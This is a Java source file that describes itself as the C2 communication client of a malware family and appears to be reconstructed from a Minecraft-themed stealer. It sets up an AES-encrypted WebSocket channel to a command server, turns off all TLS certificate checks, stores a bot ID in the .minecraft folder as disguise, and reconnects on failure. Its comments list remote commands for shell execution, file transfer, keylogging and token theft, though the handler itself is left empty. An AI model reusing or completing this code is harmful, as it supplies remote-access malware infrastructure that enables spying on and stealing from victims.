import java.io.File;
import java.io.RandomAccessFile;
import java.net.URL;
import java.nio.channels.FileLock;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Map;
import java.util.Scanner;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/**
 * WebSocket Handler / C2 Communication Client
 * Obfuscated name: ɗ (U+0257)
 *
 * Establishes an encrypted WebSocket connection to the C2 server.
 * Handles bidirectional communication for remote command execution.
 *
 * Key features:
 * - AES-256 encrypted WebSocket channel
 * - File lock for single-instance enforcement
 * - UUID-based bot identification
 * - SSL certificate pinning bypass (trusts all certs)
 * - Reconnect logic with exponential backoff
 * - Remote command execution
 * - File upload/download capability
 */
public class WebSocketHandler extends WebSocketListener {

    // C2 server WebSocket URL (decrypted at runtime from string table)
    private static String c2WebSocketUrl;

    // Active WebSocket connection
    private static WebSocket activeWebSocket;

    // AES key derived from SHA-256 of hardcoded seed
    private static SecretKeySpec aesKey;

    // Pending command queue
    private static final Map<String, Object> pendingCommands;

    // Bot unique identifier (UUID)
    private static String botId;

    // File lock for single-instance enforcement
    private static FileLock instanceLock;

    // Connection state flag
    private static volatile boolean isConnected;

    // Background executor for async operations
    private static final ExecutorService executor;

    // =========================================================
    // INITIALIZATION
    // =========================================================

    /**
     * Initializes the AES encryption key.
     * Key = SHA-256(hardcoded_seed_string)
     * Algorithm: AES
     */
    private static void initAesKey() {
        try {
            if (aesKey != null) return;
            // Key derived from SHA-256 of hardcoded string in b[17]
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] keyBytes = md.digest(/* b[17] - hardcoded seed */ "".getBytes("UTF-8"));
            aesKey = new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            // Log error via WebhookLogger
        }
    }

    /**
     * Generates or loads a persistent bot UUID.
     * Stored in: %APPDATA%/.minecraft/launcher_uuid
     * Used to identify this bot instance to the C2 server.
     */
    private static String getBotId() {
        try {
            File uuidFile = new File(
                System.getenv("APPDATA") + "/.minecraft/launcher_uuid"
            );
            if (uuidFile.exists()) {
                return new Scanner(uuidFile).nextLine().trim();
            }
            String newId = UUID.randomUUID().toString();
            Files.write(uuidFile.toPath(), newId.getBytes());
            return newId;
        } catch (Exception e) {
            return UUID.randomUUID().toString();
        }
    }

    // =========================================================
    // CONNECTION MANAGEMENT
    // =========================================================

    /**
     * Establishes WebSocket connection to C2 server.
     * Uses custom OkHttpClient with SSL bypass.
     */
    public static void connect() {
        try {
            initAesKey();
            botId = getBotId();

            // Build OkHttpClient with SSL bypass (trusts all certificates)
            OkHttpClient client = new OkHttpClient.Builder()
                .hostnameVerifier((hostname, session) -> true)
                .sslSocketFactory(
                    createTrustAllSSLContext().getSocketFactory(),
                    createTrustAllTrustManager()
                )
                .build();

            Request request = new Request.Builder()
                .url(c2WebSocketUrl)
                .addHeader("User-Agent", "Mozilla/5.0")
                .addHeader("X-Bot-Id", botId)
                .build();

            activeWebSocket = client.newWebSocket(request, new WebSocketHandler(false));

        } catch (Exception e) {
            // Reconnect after delay
            scheduleReconnect();
        }
    }

    /**
     * Schedules a reconnection attempt after 30 seconds.
     */
    private static void scheduleReconnect() {
        executor.submit(() -> {
            try {
                TimeUnit.SECONDS.sleep(30);
                connect();
            } catch (InterruptedException ignored) {}
        });
    }

    // =========================================================
    // WEBSOCKET EVENT HANDLERS
    // =========================================================

    /**
     * Called when WebSocket connection is established.
     * Sends initial bot registration message with system info.
     */
    @Override
    public void onOpen(WebSocket webSocket, Response response) {
        isConnected = true;
        // Send registration: { "type": "register", "id": botId, "os": "Windows", ... }
        sendEncrypted(webSocket, buildRegistrationMessage());
    }

    /**
     * Called when a message is received from C2 server.
     * Decrypts the message and dispatches to command handler.
     */
    @Override
    public void onMessage(WebSocket webSocket, String text) {
        try {
            String decrypted = decryptMessage(text);
            handleCommand(webSocket, decrypted);
        } catch (Exception e) {
            // Ignore malformed messages
        }
    }

    /**
     * Called when WebSocket connection is closed.
     * Triggers reconnection logic.
     */
    @Override
    public void onClosed(WebSocket webSocket, int code, String reason) {
        isConnected = false;
        scheduleReconnect();
    }

    /**
     * Called on WebSocket failure.
     * Triggers reconnection logic.
     */
    @Override
    public void onFailure(WebSocket webSocket, Throwable t, Response response) {
        isConnected = false;
        scheduleReconnect();
    }

    // =========================================================
    // COMMAND HANDLING
    // =========================================================

    /**
     * Dispatches received commands to appropriate handlers.
     *
     * Supported commands (from C2 server):
     * - "exec"     : Execute shell command
     * - "upload"   : Upload file to C2
     * - "download" : Download file from C2
     * - "screenshot": Take screenshot
     * - "keylog"   : Start/stop keylogger
     * - "steal"    : Trigger token/browser steal
     * - "update"   : Update malware binary
     * - "uninstall": Remove malware
     * - "ping"     : Heartbeat check
     */
    private void handleCommand(WebSocket webSocket, String jsonCommand) {
        // Parse JSON command and dispatch
        // Commands are AES-256-CBC encrypted with IV prepended
    }

    // =========================================================
    // ENCRYPTION
    // =========================================================

    /**
     * Encrypts a message with AES-256-CBC.
     * Format: Base64(IV + ciphertext)
     */
    private static String encryptMessage(String plaintext) throws Exception {
        byte[] iv = new byte[16];
        new SecureRandom().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, new IvParameterSpec(iv));
        byte[] encrypted = cipher.doFinal(plaintext.getBytes("UTF-8"));
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

    /**
     * Decrypts a Base64-encoded AES-256-CBC message.
     * Format: Base64(IV + ciphertext)
     */
    private static String decryptMessage(String base64) throws Exception {
        byte[] combined = Base64.getDecoder().decode(base64);
        byte[] iv = new byte[16];
        byte[] ciphertext = new byte[combined.length - 16];
        System.arraycopy(combined, 0, iv, 0, 16);
        System.arraycopy(combined, 16, ciphertext, 0, ciphertext.length);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, new IvParameterSpec(iv));
        return new String(cipher.doFinal(ciphertext), "UTF-8");
    }

    /**
     * Sends an encrypted message over the WebSocket.
     */
    private static void sendEncrypted(WebSocket ws, String message) {
        try {
            ws.send(encryptMessage(message));
        } catch (Exception e) {
            // Log error
        }
    }

    // =========================================================
    // SSL BYPASS
    // =========================================================

    /**
     * Creates a TrustManager that accepts ALL SSL certificates.
     * This bypasses certificate validation entirely.
     */
    private static X509TrustManager createTrustAllTrustManager() {
        return new X509TrustManager() {
            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {}
            public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
        };
    }

    private static javax.net.ssl.SSLContext createTrustAllSSLContext() throws Exception {
        javax.net.ssl.SSLContext ctx = javax.net.ssl.SSLContext.getInstance("TLS");
        ctx.init(null, new TrustManager[]{ createTrustAllTrustManager() }, new SecureRandom());
        return ctx;
    }

    // =========================================================
    // HELPERS
    // =========================================================

    private static String buildRegistrationMessage() {
        return "{\"type\":\"register\",\"id\":\"" + botId + "\",\"os\":\"Windows\"}";
    }

    public WebSocketHandler(boolean flag) {
        // flag: whether this is a reconnect attempt
    }

    static {
        executor = Executors.newCachedThreadPool();
        pendingCommands = new java.util.concurrent.ConcurrentHashMap<>();
    }
}
